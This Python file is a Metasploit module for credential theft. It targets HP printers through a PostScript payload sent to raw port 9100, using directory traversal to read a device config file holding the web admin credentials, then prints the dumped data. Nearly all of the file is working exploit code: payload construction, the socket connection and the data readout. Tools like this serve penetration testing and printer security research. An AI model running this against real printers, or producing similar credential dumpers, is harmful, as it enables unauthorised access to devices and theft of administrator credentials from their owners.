#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Automated PJL/PS cred dumper for vulnerable HP printers (must have dir traversal and '/dev/rdsk_jdi_cfg0')

from dataclasses import replace
from metasploit import module
import logging
import time
import socket
import ipaddress

metadata = {
    'name': 'hp_printer_traversal_dump',
    'description': '''
        Automated PostScript web credential dumper for vulerable HP (or other make) printers.
        This module sends a file read payload using a set directory traversal
        technique to read files outside the sandboxed PS file share typically
        found on port 9100. By default the module will try to read the web admin credentials
        via '/dev/rdsk_jdi_cfg0'. Directory traversal options can be discovered
        with an external tool such as PRET and running 'fuzz path' or 'fuzz blind'
        on a target host.
    ''',
    'authors': [
        'Ismaeel Mian (aredspy)'
    ],
    'date': '2022-06-27',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'http://hacking-printers.net/wiki/index.php/File_system_access'},
        {'type': 'cve', 'ref': '2012-5221'}
    ],
    'type': 'single_scanner',
    'options': {
        #'rhosts': {'type': 'address', 'description': 'The target host(s)', 'required': True, 'default': None},
        'RPORT': {'type': 'port', 'description': 'The target raw printer port (see http://hacking-printers.net/wiki/index.php/Port_9100_printing)', 'required': True, 'default': 9100},
        'traversal_path': {'type': 'string', 'description': 'Traversal technique to use (or unset for none)', 'required': False, 'default': '../../../'},
        'file_path': {'type': 'string', 'description': 'The target file to read data from', 'required': True, 'default': '/dev/rdsk_jdi_cfg0'},
        #'protocol': {'type': 'string', 'description': 'Protocol to use. Accepted: PJL or PS', 'required': True, 'default': 'PS'},
        'buffer_chunks': {'type': 'int', 'description': 'The amount of 256 bytes chunks to read from file. Useful for reading device files which may return infinite bytes.', 'required': True, 'default': '20'},
    }
}

def run(args):

    #logging
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))

    #lazy fix for unused PJL
    args['protocol'] = 'PS'

    #create payload

    if args['file_path'][0:1] == '/' or args['file_path'][0:1] == '\\':
        file_path = args['file_path'][1:]
    else:
        file_path = args['file_path']

    try:
        fullpath = args['traversal_path'] + file_path
    except Exception:
        fullpath = file_path

    if args['protocol'].upper() == 'PS':

        #Use multiline strings they said. Will make your code look more clean they said.
        payload = '''@PJL ENTER LANGUAGE = POSTSCRIPT
/byte (0) def
/infile (''' + fullpath + ''') (r) file def
{ infile read {byte exch 0 exch put
(%stdout) (w) file byte writestring}
{infile closefile exit} ifelse
} loop
'''

    elif args['protocol'].upper() == 'PJL':
        pass
    else:
        logging.error('{}'.format('Please specify either PJL or PS for the protocol'))
        return

    #create tcp connection and send payload
    
    addr = ipaddress.ip_address(args['rhost'])

    if addr.version == 4:
        s_type = socket.AF_INET
    elif addr.version == 6:
        s_type = socket.AF_INET6

    s = socket.socket(s_type, socket.SOCK_STREAM)

    try:
        logging.debug('{}'.format('connecting...'))
        s.connect((addr.exploded, int(args['RPORT'])))
    except Exception:
        logging.error('{}'.format('refused the connection (is the target port open?)'))
        return

    #send payload
    logging.info('{}'.format('sending file read payload...'))

    #read data output and print to console
    #size = 256
    samples = 0
    data = b''
    try:
        s.sendall(payload.encode('ascii'))
        while samples < int(args['buffer_chunks']):
            temp = s.recv(256)
            #size = len(temp)
            data = data + temp
            samples += 1
    except Exception:
        logging.error('{}'.format('Socket error with recv (is host responding/filtered?)'))
    
    s.close()
    logging.info('{}'.format('Data dump as ASCII:'))
    ascii_data = data.decode('ascii', errors='replace')
    logging.info(ascii_data)
    #logging.info(data)
    

if __name__ == '__main__':
    module.run(metadata, run)